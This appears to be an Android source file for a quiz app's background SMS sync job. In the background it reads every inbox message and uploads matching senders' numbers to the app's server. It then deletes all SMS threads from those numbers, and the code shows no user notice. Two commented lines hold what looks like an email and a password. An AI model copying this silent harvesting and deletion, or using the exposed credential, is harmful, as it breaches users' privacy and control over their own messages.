package com.moulinette.sms;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Telephony;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.evernote.android.job.Job;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.moulinette.models.quiz.play_board.QuizSubmitionResponce;
import com.moulinette.models.sms.SM;
import com.moulinette.models.sms.SMSPostRequest;
import com.moulinette.models.sms.short_codes.GetShortCodeRequest;
import com.moulinette.models.sms.short_codes.GetShortCodeResponce;
import com.moulinette.models.sms.short_codes.ShortCode;
import com.moulinette.sms.sms_db.DatabaseClient;
import com.moulinette.sms.sms_db.pojo.SMS;
import com.moulinette.utilities.MainApplication;
import com.moulinette.utilities.TinyDB;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.Set;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static com.facebook.FacebookSdk.getApplicationContext;

public class DemoSyncJob extends Job {

    public static final String TAG = "job_demo_tag";
    List<SMS> smsList = new ArrayList <>();
    List<SM> smList = new ArrayList <>();

    String shortCodee = "";

    List<ShortCode> shortCodesList = new ArrayList <>();
    TinyDB tinyDB;

    @RequiresApi ( api = Build.VERSION_CODES.KITKAT )
    @Override
    @NonNull
    protected Result onRunJob(@NonNull final Params params) {

        boolean success = new DemoSyncEngine(getContext()).sync();

//        getAllSms(getContext());
        getSMS();

//        shivandev91@gmail.com
//        shivan@1234


//        Toast.makeText(getContext(), "Service run", Toast.LENGTH_SHORT).show();


//        PendingIntent pendingIntent = PendingIntent.getActivity(getContext(), 0, new Intent(getContext(), Login.class), 0);
//
//        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel channel = new NotificationChannel(TAG, "Job Demo", NotificationManager.IMPORTANCE_LOW);
//            channel.setDescription("Job demo job");
//            getContext().getSystemService(NotificationManager.class).createNotificationChannel(channel);
//        }
//
//        Notification notification = new NotificationCompat.Builder(getContext(), TAG)
//                .setContentTitle("ID " + params.getId())
//                .setContentText("Job ran, exact " + params.isExact() + " , periodic " + params.isPeriodic() + ", transient " + params.isTransient())
//                .setAutoCancel(true)
//                .setChannelId(TAG)
//                .setSound(null)
//                .setContentIntent(pendingIntent)
//                .setSmallIcon(R.drawable.app_logo)
//                .setShowWhen(true)
//                .setColor(Color.GREEN)
//                .setLocalOnly(true)
//                .build();
//
//        NotificationManagerCompat.from(getContext()).notify(new Random().nextInt(), notification);

        return success ? Result.SUCCESS : Result.FAILURE;
    }

    private void getSMS() {
        smsList = new ArrayList <>();
        class GetTasks extends AsyncTask <Void, Void, List <com.moulinette.sms.sms_db.pojo.SMS>> {

            @Override
            protected List<com.moulinette.sms.sms_db.pojo.SMS> doInBackground(Void... voids) {
                smsList = DatabaseClient
                        .getInstance(getApplicationContext())
                        .getAppDatabase()
                        .taskDao()
                        .getSms();
                return smsList;
            }

            @RequiresApi ( api = Build.VERSION_CODES.KITKAT )
            @Override
            protected void onPostExecute(List<com.moulinette.sms.sms_db.pojo.SMS> tasks) {
                super.onPostExecute(tasks);

//                for (int i = 0; i < smsList.size(); i++) {
//                    System.out.println("Message Body: "+smsList.get(i).getBody());
//                    System.out.println("Message Number: "+smsList.get(i).getNumber());
//                }
//                for (int i = 0; i < smsList.size(); i++) {
//
////                    System.out.println("SMS Body0: "+smsList.get(i).getBody());
////                    String[] shortCode = smsList.get(i).getBody().split("-");
////
////                    if ( shortCode[0].equals("MOULI") ){
//                        SM sm = new SM();
//                        sm.setMobNumber(smsList.get(i).getNumber());
//                        sm.setThreadId("0");
////                        sm.setShortCode(shortCode[1]);
//                        sm.setShortCode(smsList.get(i).getBody());
//
//                        smList.add(sm);
////                    }
//                }
                System.out.println("Background Service0: "+smsList.size());
                getAllSms(getContext());
//                if ( smList.size()>0 ){
//                    sendnumbersToServer(smList);
//                }
//                TasksAdapter adapter = new TasksAdapter(MainActivity.this, tasks);
//                recyclerView.setAdapter(adapter);
            }
        }

        GetTasks gt = new GetTasks();
        gt.execute();
    }

//    public void deleteConvertation(String idd){
////        String address="put address only";
//
//        Cursor c = getContext().getContentResolver().query(Uri.parse("content://sms/"), new String[] { "_id", "thread_id", "address", "person", "date", "body" }, null, null, null);
//
//
//        try {
//            while (c.moveToNext()) {
//                int id = c.getInt(0);
//                System.out.println(idd+"Moulinette"+id);
//                if(idd.equals(id)){
//                    getContext().getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);}
//            }
//        } catch(Exception e) {
//
//            System.out.println("Exception occure:   "+e);
//        }
//    }

    @RequiresApi ( api = Build.VERSION_CODES.KITKAT )
    public void getAllSms(Context context) {

        try {
//        smsList = new ArrayList <>();
            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    for (int j = 0; j < totalSMS; j++) {
                        String smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.Inbox.THREAD_ID));
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
    //                    Date dateFormat= new Date(Long.valueOf(smsDate));
                        String type;

                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                type = "outbox";
                                break;
                            default:
                                type = "inbox";
                                break;
                        }

                        if ( type.equals("inbox") ){
    //                        String[] message = body.split("-");
    //                        System.out.println(message[0]+" SMS Body: "+body);
    //                        if (message[0].equals("MOULI")){

                                SMS sms = new SMS();
                                sms.setNumber(number);
    //                            sms.setShortCode(message[1]);
                                sms.setBody(body);
                                //time = thread id
                                sms.setTime(smsDate);
                                smsList.add(sms);
    //                        }
                        }
                        c.moveToNext();
                    }
                }

                System.out.println("Background Service: "+smsList.size());
                if ( smsList.size()>0 ){
                    getShortCodes();
                }
                c.close();
            } else {
                System.out.println("Moulinette: No message to show!");
            }
        } catch (Exception e ) {
            System.out.println("Exception IN SERVICE: "+e);
        }
    }

    void sendnumbersToServer(List<SM> sList){

        if ( MainApplication.isNetworkAvailable(getContext()) ){

            SMSPostRequest smsPostRequest = new SMSPostRequest();
            smsPostRequest.setSMS(sList);

            MainApplication.getApiService().postSMS(smsPostRequest).enqueue(new Callback <QuizSubmitionResponce>() {
                @Override
                public void onResponse (Call <QuizSubmitionResponce> call, Response <QuizSubmitionResponce> response){

                        for (int j = 0; j < smList.size(); j++) {
                            try {
                                System.out.println("exception: "+smList.get(j).getMobNumber());
                                delete_thread(smList.get(j).getMobNumber());

                            } catch ( Exception e ) {
                                System.out.println("exception: "+e);
                            }
                                try {
                                    deleteTask(smsList.get(j));
                                } catch ( Exception e ) {}
                        }
                }

                @Override
                public void onFailure (Call <QuizSubmitionResponce> call, Throwable t){
                    t.printStackTrace();
                }
            });
//
        } else {}

    }

    private void deleteTask(final SMS task) {
        class DeleteTask extends AsyncTask<Void, Void, Void> {

            @Override
            protected Void doInBackground(Void... voids) {
                DatabaseClient.getInstance(getApplicationContext()).getAppDatabase()
                        .taskDao()
                        .deletesms(task);
                return null;
            }

            @Override
            protected void onPostExecute(Void aVoid) {
                super.onPostExecute(aVoid);
                Toast.makeText(getApplicationContext(), "Deleted", Toast.LENGTH_LONG).show();
            }
        }
        DeleteTask dt = new DeleteTask();
        dt.execute();
    }


    public void delete_thread(String thread)
    {
        Cursor c = getApplicationContext().getContentResolver().query(
                Uri.parse("content://sms/"),new String[] {
                        "_id", "thread_id", "address", "person", "date","body" }, null, null, null);

        System.out.println("Curser count: "+c.getCount());
        try {
            while (c.moveToNext())
            {
                int id = c.getInt(0);
                String address = c.getString(2);
                System.out.println(address+"  :delete thread:  "+thread);
                if (address.equals(thread))
                {
                    getApplicationContext().getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
                }
            }
        } catch (Exception e) {
            System.out.println("SMS Exceprion occred----------------------"+e);
        }
    }

    public void getShortCodes(){

        tinyDB = new TinyDB(getContext());
        shortCodesList = new ArrayList <>();

        if ( MainApplication.isNetworkAvailable(getContext()) ){

            GetShortCodeRequest smsPostRequest = new GetShortCodeRequest();
            smsPostRequest.setUserId(tinyDB.getString("user_id"));

            MainApplication.getApiService().getShortCodes(smsPostRequest).enqueue(new Callback <GetShortCodeResponce>() {
                @RequiresApi ( api = Build.VERSION_CODES.KITKAT )
                @Override
                public void onResponse (Call <GetShortCodeResponce> call, Response <GetShortCodeResponce> response){

                    if ( response.code() == 200 ){

                        shortCodesList = response.body().getShortCode();
//                        System.out.println(smsList.size()+"   SMS SIZES    "+shortCodesList.size());
                        if ( shortCodesList.size()>0 ){

                            for (int i = 0; i < shortCodesList.size(); i++) {
                                for (int j = 0; j < smsList.size(); j++) {

                                    if ( smsList.get(j).getBody().equalsIgnoreCase(shortCodesList.get(i).getShortCode()) ){

                                        SM sm = new SM();
                                        sm.setMobNumber(smsList.get(j).getNumber());
                                        sm.setThreadId("0");
                                        sm.setShortCode(smsList.get(j).getBody());
                                        smList.add(sm);
                                    }else {
                                        splitString(smsList.get(j).getBody());
                                        if ( shortCodee.equalsIgnoreCase(shortCodesList.get(i).getShortCode()) ){

                                            SM sm = new SM();
                                            sm.setMobNumber(smsList.get(j).getNumber());
                                            sm.setThreadId("0");
                                            sm.setShortCode(smsList.get(j).getBody());
                                            smList.add(sm);
                                        }
                                    }
                                }
                            }
                            if ( smList.size()>0 ){
                                sendnumbersToServer(smList);
                            }
                        }
                    }
                }

                @Override
                public void onFailure (Call <GetShortCodeResponce> call, Throwable t){
                    t.printStackTrace();
                }
            });

        } else {}
    }

    @RequiresApi ( api = Build.VERSION_CODES.KITKAT )
    public void splitString(String str)
    {
        StringBuffer alpha = new StringBuffer(),
                num = new StringBuffer(), special = new StringBuffer();

        for (int i=0; i<str.length(); i++)
        {
//            if (Character.isDigit(str.charAt(i)))
//                num.append(str.charAt(i));
//            else if(Character.isAlphabetic(str.charAt(i)))
//                alpha.append(str.charAt(i));
//            else
//                special.append(str.charAt(i));

            if(Character.isAlphabetic(str.charAt(i)))
                alpha.append(str.charAt(i));
        }

         shortCodee = String.valueOf(alpha);
//        System.out.println("ALPHAAAAAAAAA  "+alpha);
//        System.out.println(num);
//        System.out.println(special);
    }

}

